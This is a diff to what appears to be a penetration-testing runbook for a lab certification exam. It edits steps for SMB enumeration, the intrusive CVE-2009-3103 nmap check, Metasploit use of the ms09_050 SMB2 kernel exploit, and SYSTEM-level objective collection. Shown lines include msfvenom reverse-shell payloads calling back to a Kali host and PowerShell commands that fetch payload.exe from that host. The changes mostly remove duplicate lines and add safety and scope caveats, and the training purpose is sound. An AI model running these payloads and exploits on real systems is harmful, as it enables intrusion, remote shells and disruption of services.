@@ -249,6 +249,12 @@ One authorized write test on an observed SMB path.
 
 Enter when: SMB answered.
 
+Record the protocol, dialect, OS and signing evidence before choosing a branch:
+
+```bash
+sudo nmap -Pn -n -p445 --script smb-protocols,smb2-capabilities,smb2-security-mode,smb-os-discovery '<TARGET_IP>'
+```
+
 ```text
 smbclient -N -L '//<TARGET_IP>'
 ```
@@ -259,11 +265,23 @@ For a supplied account, use `-U '<DOMAIN_OR_SERVER>\<USERNAME>'` and let smbclie
 smbclient -L '<TARGET_IP>' -p '<SMB_PORT>' -U '<DOMAIN_OR_SERVER>\<USERNAME>' --timeout 15
 ```
 
+An OS, service pack or SMB dialect match is only a vulnerability candidate. For example, Windows Server 2008 SP1 with SMB 2.0.2 does not prove CVE-2009-3103. If that exact hypothesis matters, first read the dedicated script warning, confirm disruptive testing and target recovery are authorized, then run it once:
+
+```bash
+nmap --script-help smb-vuln-cve2009-3103
+sudo nmap -Pn -n -p445 --script smb-vuln-cve2009-3103 --script-timeout 180s '<TARGET_IP>'
+```
+
+That NSE script is intrusive and DoS-capable. A vulnerable host may crash or reset. Do not repeat it while the host or TCP 445 is unstable; wait for recovery or reset the lab, then recheck basic SMB reachability before another attempt.
+
 | Result | Next |
 | --- | --- |
 | Shares listed | **SMB-02**. A share name is not read access. |
 | Login or share-list denied | **NET-05**. |
 | Domain or controller clue | **AD-01**. |
+| Candidate version or dialect only | Not proof. Run an authorized dedicated check or keep the hypothesis in **EXP-01**. |
+| Dedicated script reports `VULNERABLE` | Save the output; **EXP-01**, or **MSF-01** if using the allowance. |
+| Host crashes, resets or drops SMB | Stop retries; recover the target, then **PAUSE-RECOVERY** until SMB is stable. |
 | Transport or identity error | **NET-03**. |
 
 ## SMB-02 Read a relevant SMB share path
@@ -974,8 +992,6 @@ KRB5CCNAME='<CCACHE>' impacket-mssqlclient -windows-auth -k -no-pass '<DOMAIN>/<
 
 Stage the reviewed driver/loader, Incognito, UACME and SharpDPAPI binaries.
 
-Stage the reviewed driver/loader, Incognito, UACME and SharpDPAPI binaries.
-
 Disposable lab with a reset. WIN-01 must confirm host and architecture, WIN-07 both policy hives.
 
 ## WIN-01. Identify this Windows shell
@@ -984,15 +1000,26 @@ Enter when: you have a new Windows shell or changed token.
 
 ```powershell
 hostname
+whoami
 whoami /all
 ```
 
 Match the hostname to the assigned target and read the actual token, not the username.
 
+If `whoami` returns `nt authority\system` and the objective names a file, collect only that objective:
+
+```powershell
+Get-Item -LiteralPath '<OBJECTIVE_PATH>' | Select-Object FullName, Length, LastWriteTimeUtc
+certutil.exe -hashfile "<OBJECTIVE_PATH>" SHA256
+Get-Content -LiteralPath '<OBJECTIVE_PATH>'
+```
+
+Keep the hostname, `whoami /all`, exact path and hash as privilege and objective proof. Do not recurse profiles or collect unrelated credential stores.
+
 | Result | Next |
 | --- | --- |
 | Ordinary or restricted token | **WIN-16**, then **WIN-02** or **WIN-03**. |
-| SYSTEM on the assigned host | Objective proof if one applies; otherwise **WIN-02**. |
+| SYSTEM on the assigned host | Collect the named objective and proof above; otherwise **WIN-02**. |
 | Elevated admin on a domain member | **AD-14**. |
 | Enabled `SeImpersonatePrivilege` | **WIN-08**. |
 | Enabled `SeRestorePrivilege` / `SeManageVolumePrivilege` | **WIN-09** / **WIN-11**. |
@@ -4249,7 +4276,6 @@ Invoke-WebRequest 'http://<KALI_IP>:<PORT>/payload.exe' -OutFile 'C:\Windows\Tem
 
 SMB is the fallback when HTTP egress is blocked: `impacket-smbserver owb . -smb2support`, then `copy \\<KALI_IP>\owb\payload.exe C:\Windows\Temp\`.
 Base64 fallback over an existing shell: `[IO.File]::WriteAllBytes('C:\Windows\Temp\payload.exe',[Convert]::FromBase64String('<B64>'))`.
-Base64 fallback over an existing shell: `[IO.File]::WriteAllBytes('C:\Windows\Temp\payload.exe',[Convert]::FromBase64String('<B64>'))`.
 
 | Result | Next |
 | --- | --- |
@@ -4295,8 +4321,6 @@ Delete the target copy only after the Kali copy is verified.
 
 `msfconsole` and `msfvenom` are on Kali. The allowance is one target; note it on every attempt.
 
-`msfconsole` and `msfvenom` are on Kali. The allowance is one target; note it on every attempt.
-
 MSF is allowed on one target per exam attempt. Use manual paths first and spend the allowance where a module saves real time.
 
 ## MSF-01. Choose and review one module before use
@@ -4304,14 +4328,21 @@ MSF is allowed on one target per exam attempt. Use manual paths first and spend 
 ```text
 msfconsole -q
 search <PRODUCT> <VERSION>
-info <MODULE_NUMBER>
+use <MODULE_NUMBER>
+info
+show targets
+show payloads
 ```
 
-Read the module's rank, target, payload, required options and side effects. `check` when the module supports it. Record the module path and version; rank tells you how reliable it is. Record the module path and version; rank tells you how reliable it is.
+Read the module's rank, target, payload, required options and side effects. `check` when the module supports it. Record the module path and version; rank tells you how reliable it is.
+
+For a kernel SMB exploit, verify the target OS/build and architecture against `show targets`, and verify the payload architecture against `show payloads`. Record the crash risk, the exposed `WAIT` value and a working reset/recovery path before `check` or `run`. Some modules, including `ms09_050_smb2_negotiate_func_index`, accept x86 payloads only.
 
 | Result | Next |
 | --- | --- |
 | Module and target match the service | **MSF-02**. |
+| Target or payload architecture mismatches | Stop; select a compatible module or payload in **EXP-01**. |
+| Kernel crash risk has no reset path | Do not dispatch; **PAUSE-RECOVERY**. |
 | Prerequisites differ | **EXP-01** with the manual path. |
 | No module | **EXP-01**. |
 
@@ -4323,21 +4354,21 @@ set RHOSTS <TARGET_IP>
 set RPORT <PORT>
 set LHOST <KALI_IP>
 set LPORT <LPORT>
+set PAYLOAD <COMPATIBLE_PAYLOAD>
 show options
 run
 ```
 
-Set only options with no default; review the payload, target index and architecture. Keep a separate manual listener if the module is staged. This attempt consumes the allowance for one target. This attempt consumes the allowance for one target.
+Set only options with no default; review the payload, target index and architecture. The Metasploit module and its handler own the configured callback port, so do not start a separate listener on that port. Use a manual listener only for a standalone payload intentionally run outside the module handler. This attempt consumes the allowance for one target.
 
 | Result | Next |
 | --- | --- |
 | Session opens | **MSF-03**. |
 | Error before dispatch | Correct only the named option, rerun once. |
-| No session | **EXP-02** with the raw output. |
+| No session after the full `WAIT` period | **EXP-02** with the raw output. |
+| Target resets or the service drops | Stop retries; reset or recover it, then **PAUSE-RECOVERY** until the service is stable. |
 
 ## MSF-03. Use, route and clean up a session
-
-**Optional.** Safe to skip under exam time pressure.
 
 **Optional.** Safe to skip under exam time pressure.
 
@@ -4353,7 +4384,7 @@ route add <INTERNAL_SUBNET> <SESSION_ID>
 portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <INTERNAL_HOST>
 ```
 
-`route` sends MSF modules through the session; `portfwd` exposes one TCP port. Neither is a system proxy. Remove routes and forwards before killing the session. Remove routes and forwards before killing the session.
+`route` sends MSF modules through the session; `portfwd` exposes one TCP port. Neither is a system proxy. Remove routes and forwards before killing the session.
 
 | Result | Next |
 | --- | --- |
@@ -4366,9 +4397,7 @@ Cleanup: remove forwards and routes (`portfwd delete`, `route remove`), kill the
 # payloads
 
 
-`msfvenom` is on Kali. One foreground listener, then stop it.
-
-`msfvenom` is on Kali. One foreground listener, then stop it.
+`msfvenom` is on Kali. A standalone payload gets one foreground listener, then stop it.
 
 ## PAY-01. Reverse or bind?
 
@@ -4390,16 +4419,16 @@ Bind when egress is blocked: the target listens, and you reach it through a tunn
 ## PAY-02. Generate and check one payload
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f exe -o payload.exe
+msfvenom -p windows/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f exe -o payload-x86.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f exe -o payload-x64.exe
 msfvenom -p linux/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f elf -o payload.elf
 msfvenom -p java/jsp_shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f war -o payload.war
 msfvenom -p windows/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -e x64/xor_dynamic -i 3 -f exe -o payload-enc.exe
-msfvenom -p windows/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -e x64/xor_dynamic -i 3 -f exe -o payload-enc.exe
-file payload.exe
-sha256sum payload.exe
+file payload-x86.exe payload-x64.exe
+sha256sum payload-x86.exe payload-x64.exe
 ```
 
-Staged payloads contain `/` (`windows/x64/shell/reverse_tcp`) and need a handler; stageless payloads do not. Match the target architecture, not your CPU.
+Do not default to Windows x64. Match the payload to the target process and to any module restriction, not your Kali CPU. For example, `ms09_050_smb2_negotiate_func_index` is x86-only, so select an accepted `windows/...` x86 payload inside Metasploit rather than a `windows/x64/...` payload. Staged payloads contain `/` (`windows/x64/shell/reverse_tcp`) and need a handler; stageless payloads do not.
 
 | Result | Next |
 | --- | --- |
@@ -4407,7 +4436,7 @@ Staged payloads contain `/` (`windows/x64/shell/reverse_tcp`) and need a handler
 | Wrong arch or format | Regenerate once. |
 | AV blocks it | Encode or change format; mark optional. |
 
-Listener hygiene: one foreground listener, `ncat --listen`, `rlwrap` when interactive, and stop it with Ctrl-C after the session.
+Standalone listener hygiene: use one foreground listener, `ncat --listen`, `rlwrap` when interactive, and stop it with Ctrl-C after the session. When a Metasploit handler owns `LPORT`, do not bind a second listener there.
 
 # pivoting
 
@@ -6317,7 +6346,7 @@ One completed read is the evidence; a transfer alone is not execution.
 
 ## SMB-01. What decides this step?
 
-Share names say nothing about permissions.
+Protocol and version evidence narrows a vulnerability hypothesis but does not prove it; share names also say nothing about permissions.
 
 ## SMB-02. What decides this step?
 
@@ -6437,7 +6466,7 @@ Collection is valid only after same-host admin proof.
 
 ## WIN-01. What decides this step?
 
-Host and token, not the username, decide the next branch.
+Host and token decide the next branch; SYSTEM collection stays limited to the named objective and its proof.
 
 ## WIN-16. What decides this step?
 
@@ -7094,11 +7123,11 @@ Exfiltrate through a writeable share or upload endpoint.
 
 ## MSF-01. What decides this step?
 
-Review rank, target, payload and options before spending the allowance.
+Review rank, target and payload architecture, crash risk, `WAIT` and recovery before spending the allowance.
 
 ## MSF-02. What decides this step?
 
-One configured attempt with reviewed options.
+One configured attempt with reviewed options; its handler, not a second listener, owns the callback port.
 
 ## MSF-03. What decides this step?
 
@@ -7110,7 +7139,7 @@ Reverse when egress works; bind when only the target can listen.
 
 ## PAY-02. What decides this step?
 
-Architecture and staged/stageless matter more than the format.
+Target and module architecture, including x86-only modules, decide the payload before format or staging.
 
 ## PIVOT-01. What decides this step?
 
